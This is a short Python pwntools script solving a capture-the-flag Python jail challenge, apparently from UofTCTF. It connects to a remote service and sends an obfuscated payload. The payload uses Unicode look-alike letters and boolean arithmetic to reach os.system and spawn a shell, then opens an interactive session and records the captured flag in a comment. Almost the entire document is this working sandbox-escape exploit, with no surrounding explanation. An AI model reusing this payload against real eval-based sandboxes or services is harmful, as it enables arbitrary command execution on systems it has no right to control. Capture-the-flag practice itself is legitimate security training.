from pwn import *

r = remote("35.222.133.12", 5000)

def true(n):
    return (("(()==())+"*n)[:-1])

# payload from https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md#no-ascii-letters-no-double-underscores-no-builtins-no-quotesdouble-quotes-inside-eval--python38
payload = "[𝘺:=()._＿𝘥𝘰𝘤＿_, 𝘢:=𝘺["+true(19)+"],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_["+true(1)+"]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()["+true(104)+"].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺["+true(34)+"]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺["+true(56)+"])]"

r.sendline(payload)
r.interactive()
#uoftctf{zero_security_too_apparently_lmao}